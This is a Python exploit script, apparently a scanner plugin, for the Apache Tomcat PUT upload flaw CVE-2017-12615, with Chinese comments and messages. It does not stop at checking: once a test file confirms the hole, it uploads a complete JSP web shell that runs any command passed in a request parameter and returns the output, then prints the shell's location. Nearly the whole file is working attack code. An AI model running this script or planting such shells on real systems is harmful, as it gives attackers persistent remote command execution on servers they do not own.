#!/usr/bin/env python3

'''
name: CVE-2017-12615漏洞
description: CVE-2017-12615漏洞可执行任意命令
'''

from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class CVE_2017_12615_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }
        self.check_file = '''<%out.print("test");%>'''
        self.shell_file = '''
            <%@ page import="java.util.*,java.io.*"%>
            <%
            %>
            <HTML><BODY>
            Commands with JSP
            <FORM METHOD="GET" NAME="myform" ACTION="">
            <INPUT TYPE="text" NAME="cmd">
            <INPUT TYPE="submit" VALUE="Send">
            </FORM>
            <pre>
            <%
            if (request.getParameter("cmd") != null) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
            }
            }
            %>
            </pre>
            </BODY></HTML>
        '''

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.put(self.url + "/test.jsp/", data = self.check_file, headers = self.headers)
            get_check_req = request.get(self.url + "/test.jsp", headers = self.headers)
            if get_check_req.status_code == 200 and 'test' == get_check_req.text:
                shell_req = request.put(self.url + "/shell.jsp/", data = self.shell_file, headers = self.headers)
                get_shell_req = request.get(self.url + "/shell.jsp", headers = self.headers)
                if get_shell_req.status_code == 200:
                    print ("存在CVE-2017-12615漏洞，shell文件路径为："+ self.url + "/shell.jsp")
                    return True
            else:
                print("不存在CVE-2017-12615漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2017_12615 = CVE_2017_12615_BaseVerify('http://10.3.3.196:8121')
    CVE_2017_12615.run()


